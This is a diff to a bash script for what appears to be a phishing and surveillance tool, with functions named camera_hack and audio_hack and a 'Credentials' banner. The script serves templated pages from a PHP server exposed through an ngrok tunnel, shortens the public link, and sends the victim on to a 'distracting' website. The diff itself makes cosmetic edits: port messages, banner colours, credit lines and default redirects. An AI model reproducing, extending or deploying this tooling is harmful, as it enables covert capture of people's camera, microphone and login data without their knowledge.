@@ -55,7 +55,7 @@ error_msg() {
 #######
 
 arch=`uname -m`
-
+ArNam=$(dpkg --print-architecture)
 #spinner
 spinner() {
         pid=$!
@@ -378,6 +378,9 @@ fi
 launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
 elif [[ $drk == n || $drk == N ]]; then
 PORT="8686"
+echo
+printf "${cyan1}Your Default Port is $PORT !${white} \n"
+sleep 2
 launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
 else
 	echo
@@ -391,15 +394,15 @@ fi
 
 #banner2
 banner2() {
-	printf "\n${green}
+	printf "\n${cyan1}
         ╔════════════════════════════════════╗
         ║${white}   ╔═╗┬─┐┌─┐┌┬┐┌─┐┌┐┌┌┬┐┬┌─┐┬  ┌─┐${green}  ║
         ║${white}   ║  ├┬┘├┤  ││├┤ │││ │ │├─┤│  └─┐${green}  ║
         ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
         ╚════════════════════════════════════╝
-	Author    : ${white}Ashish singh${green}
+	#Author    : ${white}Ashish singh${green}  when officially publish!
         Reborn by : ${white}Mr.Derek(t2g)${green}
-        Publisher : ${white}Bhavik Oza${green}
+        #Publisher : ${white}Bhavik Oza${green}
 
         》 ${cyan1}${final_url}${green} 《
                 	or                 
@@ -480,8 +483,8 @@ function camera_hack() {
 # Voice Hack
 
 function audio_hack() {	
-        default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
-        printf "\n${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://youtube.com) : " $default_redirect && read redirect_link
+        default_redirect="https://google.com"
+        printf "\n${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://google.com) : " $default_redirect && read redirect_link
         redirect_link="${redirect_link:-${default_redirect}}";link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
         sed 's+forwarding_link+'$link'+g' template.php > index.php;sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
 	main
